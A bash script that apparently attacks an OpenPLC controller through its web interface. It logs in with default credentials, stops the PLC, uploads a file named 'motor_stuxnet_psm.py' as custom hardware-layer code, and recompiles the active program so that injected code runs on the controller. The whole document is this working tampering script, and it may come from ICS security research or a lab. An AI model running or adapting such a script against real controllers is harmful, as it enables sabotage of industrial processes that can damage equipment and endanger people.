#!/bin/bash

#PLC_URL="172.16.101.10:8080"
PLC_URL=$1
PLC_USERNAME="openplc"
PLC_PASSWORD="openplc"
COOKIE_JAR="plc_cookie.txt"
# MOTOR_ST_FILE="motor.st"
STUXNET_FILE="motor_stuxnet_psm.py"
# MOTOR_PROGRAM_NAME="motor_test"


# Login and get session cookie
echo "Login..."
curl -c "$COOKIE_JAR" \
     -X POST "$PLC_URL/login" \
     -d "username=$PLC_USERNAME&password=$PLC_PASSWORD" > /dev/null

# ======== # 
# Stop PLC #
# ======== #
echo "Stop PLC..."
curl -b "$COOKIE_JAR" \
        -X GET "$PLC_URL/stop_plc" > /dev/null

# =============== # 
# Get Active File #
# =============== #
echo "Retrieve active file..."
ACTIVE_FILE_RESPONSE=$(curl -b "$COOKIE_JAR" "http://$PLC_URL/dashboard")
ACTIVE_FILE_REGEX="([0-9]+\.st)"

if [[ "$ACTIVE_FILE_RESPONSE" =~ $ACTIVE_FILE_REGEX ]]; then
    MATCH_FILE="${BASH_REMATCH[1]}"
else
    echo "PATTERN not found"
fi

# ========================= # 
# Enable PSM hardware layer #
# ========================= #
# Trying to avoid modbus server error by changing to blank, then back to psm_linux
echo "Change HW Layer..."
# curl -b "$COOKIE_JAR" \
#         -X POST "$PLC_URL/hardware" \
#         -F "hardware_layer=blank" \
#         -F "custom_layer_code=<$STUXNET_FILE"

# curl -b "$COOKIE_JAR" \
#      -X GET "$PLC_URL/compile-program?file=$MATCH_FILE" > /dev/null

# COMPILE_LOGS=""
# COMPILE_REGEX=".*Compilation finished"
# while ! [[ "$COMPILE_LOGS" =~ $COMPILE_REGEX ]]; do
#     COMPILE_LOGS=$(curl -s -b $COOKIE_JAR "http://$PLC_URL/compilation-logs")
#     #echo $COMPILE_LOGS
# done

curl -b "$COOKIE_JAR" \
        -X POST "$PLC_URL/hardware" \
        -F "hardware_layer=psm_linux" \
        -F "custom_layer_code=<$STUXNET_FILE" > /dev/null

# ========= # 
# Recompile #
# ========= #
echo "Compile..."
curl -b "$COOKIE_JAR" \
     -X GET "$PLC_URL/compile-program?file=$MATCH_FILE" > /dev/null

COMPILE_LOGS=""
COMPILE_REGEX=".*Compilation finished"
while ! [[ "$COMPILE_LOGS" =~ $COMPILE_REGEX ]]; do
    COMPILE_LOGS=$(curl -s -b $COOKIE_JAR "http://$PLC_URL/compilation-logs")
    #echo $COMPILE_LOGS
done

# echo "Start..."
# curl -b "$COOKIE_JAR" \
#         -X GET "$PLC_URL/start_plc" > /dev/null
# echo $UPLOAD_RESPONSE